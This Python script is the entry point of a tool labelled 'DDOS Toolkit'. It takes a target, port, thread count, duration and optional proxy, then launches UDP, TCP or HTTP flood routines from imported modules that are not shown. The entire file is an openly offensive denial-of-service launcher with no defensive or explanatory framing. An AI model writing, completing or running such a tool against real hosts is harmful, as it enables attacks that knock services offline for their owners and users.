import argparse
from modules.udp_flood import run_udp
from modules.tcp_flood import run_tcp
from modules.http_flood import run_http

parser = argparse.ArgumentParser(description="DDOS Toolkit")
parser.add_argument('--mode', choices=['udp', 'tcp', 'http'], required=True)
parser.add_argument('--target', required=True)
parser.add_argument('--port', type=int, default=80)
parser.add_argument('--threads', type=int, default=100)
parser.add_argument('--duration', type=int, default=60)
parser.add_argument('--proxy', default=None)

args = parser.parse_args()

if args.mode == "udp":
    run_udp(args.target, args.port, args.threads, args.duration)
elif args.mode == "tcp":
    run_tcp(args.target, args.port, args.threads, args.duration)
elif args.mode == "http":
    run_http(args.target, args.threads, args.duration, args.proxy)
